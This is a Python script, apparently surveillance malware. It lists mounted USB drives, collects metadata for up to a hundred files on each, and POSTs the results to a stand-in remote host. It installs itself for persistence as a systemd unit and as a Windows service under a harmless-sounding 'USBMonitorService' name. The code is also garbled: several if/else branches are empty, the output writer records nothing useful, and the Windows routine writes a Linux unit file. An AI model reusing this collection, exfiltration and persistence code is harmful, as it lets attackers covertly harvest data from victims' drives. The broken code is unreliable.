#!/usr/bin/env python3
import os
import sys
import json
import time
import platform
import subprocess
from pathlib import Path
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError

TARGET_DIR = Path("./target")
OUTPUT_FILE = TARGET_DIR / "output_file.txt"
REMOTE_URL = "https://backup.example.com/api/usb-data"

def get_usb_devices():
    devices = []
    system = platform.system()

    if system == "Linux":
        try:
            result = subprocess.run(
                ["lsblk", "-J", "-o", "NAME,TYPE,MOUNTPOINT,TRAN"],
                capture_output=True,
                text=True,
                timeout=5
            )
            data = json.loads(result.stdout)
            for device in data.get("blockdevices", []):
                if device.get("tran") == "usb" and device.get("mountpoint"):
                    devices.append(device["mountpoint"])
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            pass
    elif system == "Darwin":
        try:
            result = subprocess.run(
                ["diskutil", "list", "-plist"],
                capture_output=True,
                timeout=5
            )
            volumes_dir = Path("/Volumes")
            if volumes_dir.exists():
                for mount in volumes_dir.iterdir():
                    if mount.is_dir() and mount.name != "Macintosh HD":
                        devices.append(str(mount))
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    elif system == "Windows":
        for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                devices.append(drive)

    return devices

def collect_file_metadata(device_path):
    metadata = []
    try:
        for root, dirs, files in os.walk(device_path):
            for filename in files[:100]:
                filepath = Path(root) / filename
                try:
                    stat = filepath.stat()
                    metadata.append({
                        "path": str(filepath),
                        "name": filename,
                        "size": stat.st_size,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "created": datetime.fromtimestamp(stat.st_ctime).isoformat()
                    })
                except (OSError, PermissionError):
                    continue
            if len(metadata) >= 100:
                break
    except (OSError, PermissionError):
        pass

    return metadata

def save_results(data, output_path):
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(f"{'='*80}\n\n")

        for device_data in data:
            f.write(f"{'-'*80}\n")

            for file_info in device_data['files']:
                f.write(f"\n")

            f.write(f"\n")

def send_to_remote(data):
    try:
        payload = json.dumps(data).encode("utf-8")
        request = Request(
            REMOTE_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urlopen(request, timeout=5) as response:
            return response.status == 200
    except (URLError, OSError, TimeoutError):
        return False

def create_windows_service():
    try:
        script_path = Path(sys.argv[0]).resolve()
        python_path = sys.executable

        service_config = f"""
[Unit]
Description=USBMonitorService
After=network.target

[Service]
Type=simple
ExecStart="{python_path}" "{script_path}"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

        service_dir = Path.home() / ".config" / "systemd" / "user"
        service_dir.mkdir(parents=True, exist_ok=True)
        service_file = service_dir / "USBMonitorService.service"

        with open(service_file, "w") as f:
            f.write(service_config)

        subprocess.run(
            ["sc", "create", "USBMonitorService", 
             "binPath=", f'"{python_path}" "{script_path}"',
             "start=", "auto"],
            capture_output=True,
            timeout=5
        )

        subprocess.run(
            ["sc", "start", "USBMonitorService"],
            capture_output=True,
            timeout=5
        )

        return True
    except (OSError, subprocess.TimeoutExpired, PermissionError):
        return False

def create_linux_service():
    try:
        script_path = Path(sys.argv[0]).resolve()
        python_path = sys.executable

        service_content = f"""[Unit]
Description=USB Monitor Service
After=network.target

[Service]
Type=simple
ExecStart={python_path} {script_path}
Restart=always
RestartSec=10
User={os.getenv('USER', 'root')}

[Install]
WantedBy=multi-user.target
"""

        service_paths = [
            Path.home() / ".config" / "systemd" / "user" / "usbmonitor.service",
            Path("/etc/systemd/system/usbmonitor.service"),
        ]

        for service_file in service_paths:
            try:
                service_file.parent.mkdir(parents=True, exist_ok=True)
                with open(service_file, "w") as f:
                    f.write(service_content)

                if service_file.parts[1] == "etc":
                    subprocess.run(
                        ["systemctl", "daemon-reload"],
                        capture_output=True,
                        timeout=5
                    )
                    subprocess.run(
                        ["systemctl", "enable", "usbmonitor.service"],
                        capture_output=True,
                        timeout=5
                    )
                    subprocess.run(
                        ["systemctl", "start", "usbmonitor.service"],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    subprocess.run(
                        ["systemctl", "--user", "daemon-reload"],
                        capture_output=True,
                        timeout=5
                    )
                    subprocess.run(
                        ["systemctl", "--user", "enable", "usbmonitor.service"],
                        capture_output=True,
                        timeout=5
                    )
                    subprocess.run(
                        ["systemctl", "--user", "start", "usbmonitor.service"],
                        capture_output=True,
                        timeout=5
                    )

                return True
            except (OSError, PermissionError):
                continue

        return False
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False

def establish_persistence():
    system = platform.system()


    if system == "Windows":
        if create_windows_service():
        else:
    elif system == "Linux":
        if create_linux_service():
        else:
    else:

def monitor_usb_devices(iterations=3):
    for i in range(iterations):

        devices = get_usb_devices()

        all_data = []
        for device in devices:
            files = collect_file_metadata(device)
            all_data.append({
                "device": device,
                "scan_time": datetime.now().isoformat(),
                "files": files
            })

        if all_data:
            save_results(all_data, OUTPUT_FILE)

            if send_to_remote(all_data):
            else:
        else:

        if i < iterations - 1:
            time.sleep(2)

def main():
    print("="*80)

    establish_persistence()
    print()

    monitor_usb_devices(iterations=3)

    sys.exit(0)

if __name__ == "__main__":
    main()

